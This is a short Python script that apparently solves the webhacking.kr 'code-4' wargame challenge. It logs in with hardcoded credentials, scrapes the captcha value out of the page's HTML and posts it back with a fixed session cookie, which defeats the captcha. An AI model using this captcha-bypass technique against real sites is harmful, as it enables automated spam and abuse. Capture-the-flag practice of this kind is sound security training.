import requests
import re

r = requests.Session()
login = r.post("https://webhacking.kr/login.php?login", json={"id":"xon1l", "pw":"123456"})
req = r.get('https://webhacking.kr/challenge/code-4/')
captcha = re.findall(r'<input type=button name=captcha_ value="(.*)" style=', req.text)[0]
data={"id":1,"cmt":1,"captcha":captcha}
cookie={"PHPSESSID":"ekuru4sk6jj68c8g4ihq7bja4j", "st":"1695813129"}
res = r.post('https://webhacking.kr/challenge/code-4/', data=data, cookies=cookie)
print(res.text)